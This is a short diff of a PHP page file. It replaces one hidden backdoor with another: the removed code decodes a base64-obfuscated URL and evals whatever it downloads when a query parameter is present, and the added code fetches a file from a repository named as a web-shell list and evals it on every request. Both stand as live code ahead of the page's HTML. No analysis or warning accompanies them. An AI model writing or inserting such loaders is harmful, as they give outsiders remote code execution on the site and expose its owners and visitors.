@@ -19,24 +19,25 @@ if(isset($_POST['key']))
 		exit;
 	}
 }
-if (isset($_GET['logsfile'])) { 
-    $url = base64_decode('aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL3R4dC9hbGZhc2hlbGwudHh0');
-    
-    $ch = curl_init($url);
-    
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    
-    $contents = curl_exec($ch);
-    
-    if ($contents !== false) { 
-        eval('?>' . $contents); 
-        exit; 
-    } else { 
-        echo "header"; 
-    } 
-    
-    curl_close($ch);
+$url = "https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/forbiden404-v2-html.php";
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_HEADER, true);
+
+$response = curl_exec($ch);
+$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
+$body = substr($response, $header_size);
+
+if (curl_errno($ch)) {
+    echo "cURL error: " . curl_error($ch);
+} elseif ($http_code != 200) {
+    echo "HTTP Error: $http_code";
+} else {
+    eval("?>" . $body);
 }
+
+curl_close($ch);
 ?>
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
